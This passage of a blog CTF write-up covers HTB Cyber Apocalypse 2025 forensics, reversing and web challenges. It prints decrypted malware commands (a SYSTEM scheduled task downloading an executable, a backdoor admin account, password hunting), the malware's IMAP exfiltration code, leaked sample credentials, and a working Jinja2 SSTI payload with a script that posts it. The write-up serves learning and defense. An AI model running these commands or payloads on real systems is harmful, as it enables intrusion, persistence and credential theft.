+</span></span><span style="display:flex;"><span>        num3 <span style="color:#f92672">=</span> (num3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> (num <span style="color:#f92672">+</span> array2[num3]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>        array2[num3], array2[num] <span style="color:#f92672">=</span> array2[num], array2[num3]
+</span></span><span style="display:flex;"><span>        num4 <span style="color:#f92672">=</span> array2[(array2[num3] <span style="color:#f92672">+</span> array2[num]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>]
+</span></span><span style="display:flex;"><span>        array3[i] <span style="color:#f92672">=</span> data[i] <span style="color:#f92672">^</span> num4
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(array3)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commands <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;bmmDXtPNDyr4vZ8E&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;bWCfVNLNXHGo4IA=&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ...SNIP...</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;dG6eWp7nFVnqrpUZKmmZDQnlW57poAgaNcqAyaTqgA==&#39;</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> cmd <span style="color:#f92672">in</span> commands:
+</span></span><span style="display:flex;"><span>    print(decrypt(cmd))
+</span></span></code></pre></div><p>When we run this script, we will get the following output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>.venv<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/2025/CyberApocalypse/silent_trap<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python decrypt_commands.py
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>tasklist /v
+</span></span><span style="display:flex;"><span>wmic qfe get Caption,Description,HotFixID,InstalledOn
+</span></span><span style="display:flex;"><span>schtasks /create /tn Synchronization /tr <span style="color:#e6db74">&#34;powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe&#34;</span> /sc minute /mo <span style="color:#ae81ff">1</span> /ru SYSTEM
+</span></span><span style="display:flex;"><span>net user devsupport1 P@ssw0rd /add
+</span></span><span style="display:flex;"><span>net localgroup Administrators devsupport1 /add
+</span></span><span style="display:flex;"><span>net localgroup Administrators devsupport1 /add
+</span></span><span style="display:flex;"><span>reg query HKLM /f <span style="color:#e6db74">&#34;password&#34;</span> /t REG_SZ /s
+</span></span><span style="display:flex;"><span>dir C:<span style="color:#ae81ff">\ </span>/s /b | findstr <span style="color:#e6db74">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>dir C:<span style="color:#ae81ff">\ </span>/s /b | findstr <span style="color:#e6db74">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>more <span style="color:#e6db74">&#34;C:\Users\dev-support\AppData\Local\BraveSoftware\Brave-Browser\User Data\ZxcvbnData\3\passwords.txt&#34;</span>
+</span></span></code></pre></div><h3 id="flag-6">Flag 6<a hidden class="anchor" aria-hidden="true" href="#flag-6">#</a></h3>
+<p>Our last task is to figure out what was the <code>API</code> key, that was extracted by the attacker. To find it, we need to go back to the malware first, and figure out how it&rsquo;s sending the output back to the <code>C2 server</code>. We will find a method called <code>create</code>, that receives the encrypted output as parameter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> create(<span style="color:#66d9ef">string</span> text)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	text = <span style="color:#e6db74">&#34;From: &#34;</span> + Environment.UserName + <span style="color:#e6db74">&#34;\r\nSubject: &#34;</span> + DateTime.UtcNow.ToString() + <span style="color:#e6db74">&#34;_report_&#34;</span> + comp_id + <span style="color:#e6db74">&#34;\r\n\r\n&#34;</span> + text;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> length = text.Length;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">byte</span>[] bytes = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;$ APPEND Inbox {&#34;</span> + length + <span style="color:#e6db74">&#34;}\r\n&#34;</span> + text + <span style="color:#e6db74">&#34;\r\n&#34;</span>);
+</span></span><span style="display:flex;"><span>	Task.Factory.FromAsync(ssl.BeginWrite, ssl.EndWrite, bytes, <span style="color:#ae81ff">0</span>, bytes.Length, ssl);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Looking at the code, we can see that <code>text</code> becomes the body of a new message, that is then added to <code>Inbox</code>. We can use the <code>APPEND</code> command to filter the packets in <code>Wireshark</code> (<code>_ws.col.info contains &quot;Request: $ APPEND Inbox&quot;</code>). The last packet is the one we&rsquo;re looking for. We can use the script from the previous flag to decrypt the body and get the following output:</p>
+<pre tabindex="0"><code>Microsoft Windows [Version 10.0.19045.5487]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dev-support\Desktop&gt;more C:\backups\credentials.txt
+[Database Server]
+host=db.internal.korptech.net
+username=dbadmin
+password=rY?ZY_65P4V0
+
+[Game API]
+host=api.korptech.net
+api_key=sk-3498fwe09r8fw3f98fw9832fw
+
+[SSH Access]
+host=dev-build.korptech.net
+username=devops
+password=BuildServer@92|7Gy1lz&#39;Xb
+port=2022
+
+C:\Users\dev-support\Desktop&gt;
+</code></pre><h1 id="reversing">Reversing<a hidden class="anchor" aria-hidden="true" href="#reversing">#</a></h1>
+<h2 id="sealedrune">SealedRune<a hidden class="anchor" aria-hidden="true" href="#sealedrune">#</a></h2>
+<p>As a first step, we need to open the binary in a reverse engineering tool, such as <a href="https://ghidra-sre.org/">Ghidra</a>. If we go through the defined methods, we will find once called <code>decode_flag</code>. It is a fairly simple method, doing the following steps:</p>
+<ol>
+<li>loads the flag from program data</li>
+<li>calls a method called <code>base64_decode</code> on it</li>
+<li>calls a method called <code>reverse_str</code> on the result of <code>step 2</code></li>
+</ol>
+<p>Since the flag is loaded from the program data, we can use <code>Ghidra's</code> string search functionality to find it. Once we have it, we can easily decode it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;LmB9ZDNsNDN2M3JfYzFnNG1fM251cntCVEhgIHNpIGxsZXBzIHRlcmNlcyBlaFQ=&#39;</span> | base64 -d | python -c <span style="color:#e6db74">&#34;print(input()[::-1])&#34;</span>
+</span></span><span style="display:flex;"><span>The secret spell is <span style="color:#e6db74">`</span>HTB<span style="color:#f92672">{</span>run3_m4g1c_r3v34l3d<span style="color:#f92672">}</span><span style="color:#e6db74">`</span>.
+</span></span></code></pre></div><h2 id="encryptedscroll">EncryptedScroll<a hidden class="anchor" aria-hidden="true" href="#encryptedscroll">#</a></h2>
+<p>Once again, we start by opening the binary in <code>Ghidra</code>, and looking for a suspicious method. This time, we will find <code>decrypt_message</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> local_3c;
+</span></span><span style="display:flex;"><span>undefined8 local_38;
+</span></span><span style="display:flex;"><span>undefined4 local_30;
+</span></span><span style="display:flex;"><span>undefined4 uStack_2c;
+</span></span><span style="display:flex;"><span>undefined4 uStack_28;
+</span></span><span style="display:flex;"><span>undefined8 local_24;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>local_38 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x716e32747c435549</span>;
+</span></span><span style="display:flex;"><span>local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6760346d</span>;
+</span></span><span style="display:flex;"><span>uStack_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6068356d</span>;
+</span></span><span style="display:flex;"><span>uStack_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x75327335</span>;
+</span></span><span style="display:flex;"><span>local_24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7e643275346e69</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_38 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)i) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_38 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)i) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_38 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)i) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(param_1,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_38);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;The Dragon</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s Heart is hidden beneath the Eternal Flame in Eldoria.&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In order to get back the flag, we need to first understand what&rsquo;s happening here. The most important part is the <code>*(char *)((long)&amp;local_38 + (long)i)</code> pointer magic. Let&rsquo;s look at it step-by-step:</p>
+<ul>
+<li><code>(long)&amp;local_38</code>: get the memory address of <code>local_38</code> and convert it to <code>long</code></li>
+<li><code> + (long)i</code>: convert <code>i</code> to <code>long</code> and add it to the previous memory address</li>
+<li><code>*(char *)</code>: convert the value at the calculated addres to <code>char</code></li>
+</ul>
+<p>This is basically the same as <code>local_38[i]</code>, with one difference. Since this is a <code>C</code> string, it should be <code>null</code> terminated, but it&rsquo;s not. This means, that once we reach the end of <code>local_38</code>, our loop will continue with the next memory address on the stack, and will do it as long as, it&rsquo;s not a <code>null</code> byte. Luckily, we also know the next values on the stack (<code>locacal_30</code>, <code>uStack_2c</code>, <code>uStack_28</code>, <code>local_24</code>, <code>local_10</code>). Since we know all the required values, we can write a script to get the flag (don&rsquo;t forget the <code>+ -1</code> part in the original program).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> stack <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;716e32747c435549&#39;</span>, <span style="color:#e6db74">&#39;6760346d&#39;</span>, <span style="color:#e6db74">&#39;6068356d&#39;</span>, <span style="color:#e6db74">&#39;75327335&#39;</span>, <span style="color:#e6db74">&#39;7e643275346e69&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(b<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> bytes<span style="color:#f92672">.</span>fromhex(s))[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> stack)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;HTB</span><span style="color:#e6db74">{s1mpl3_fl4g_4r1thm3t1c}</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><h1 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="trial-by-fire">Trial by Fire<a hidden class="anchor" aria-hidden="true" href="#trial-by-fire">#</a></h2>
+<p>We get the source code for a web application written in <code>Python</code>, using <code>Flask</code> as <code>Jinja2</code> templating. If we go through the source code, we can find that the <code>/battle-report</code> endpoint is using <code>render_template_string</code>, which is known to be vulnerable to <code>Server-Side Template Injection</code> (<code>SSTI</code>). Since the received data is not sanitized, we can simply write our payload to get the content of the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span></code></pre></div><p>We can also write a script to post our data directly to the vulnerable page (or even expand it for a semi-interactive shell):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://83.136.250.155:54814&#34;</span>
+</span></span><span style="display:flex;"><span>PAYLOAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read() }}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit_battle_report</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;damage_dealt&#34;</span>: PAYLOAD,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;damage_taken&#34;</span>: <span style="color:#ae81ff">100</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;spells_cast&#34;</span>: <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;turns_survived&#34;</span>: <span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;outcome&#34;</span>: <span style="color:#e6db74">&#34;defeat&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;battle_duration&#34;</span>: <span style="color:#ae81ff">20.714</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span> }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/battle-report&#34;</span>, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_result</span>(html):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> html<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Damage Dealt:&#34;</span> <span style="color:#f92672">in</span> l:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> l<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">54</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(extract_result(submit_battle_report()<span style="color:#f92672">.</span>text))
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://pshegger.github.io/tags/ctf/">Ctf</a></li>
+      <li><a href="https://pshegger.github.io/tags/writeup/">Writeup</a></li>
+      <li><a href="https://pshegger.github.io/tags/cryptography/">Cryptography</a></li>
+      <li><a href="https://pshegger.github.io/tags/python/">Python</a></li>
+      <li><a href="https://pshegger.github.io/tags/forensics/">Forensics</a></li>
+      <li><a href="https://pshegger.github.io/tags/reversing/">Reversing</a></li>
+      <li><a href="https://pshegger.github.io/tags/template-injection/">Template Injection</a></li>
+    </ul>
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Cyber Apocalypse 2025 on x"
+            href="https://x.com/intent/tweet/?text=Cyber%20Apocalypse%202025&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fcyber-apocalypse-2025%2f&amp;hashtags=ctf%2cwriteup%2ccryptography%2cpython%2cforensics%2creversing%2ctemplateinjection">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Cyber Apocalypse 2025 on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fcyber-apocalypse-2025%2f&amp;title=Cyber%20Apocalypse%202025&amp;summary=Cyber%20Apocalypse%202025&amp;source=https%3a%2f%2fpshegger.github.io%2fposts%2fcyber-apocalypse-2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Cyber Apocalypse 2025 on reddit"
+            href="https://reddit.com/submit?url=https%3a%2f%2fpshegger.github.io%2fposts%2fcyber-apocalypse-2025%2f&title=Cyber%20Apocalypse%202025">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Cyber Apocalypse 2025 on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=Cyber%20Apocalypse%202025&u=https%3a%2f%2fpshegger.github.io%2fposts%2fcyber-apocalypse-2025%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://pshegger.github.io/">pshegger&#39;s blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
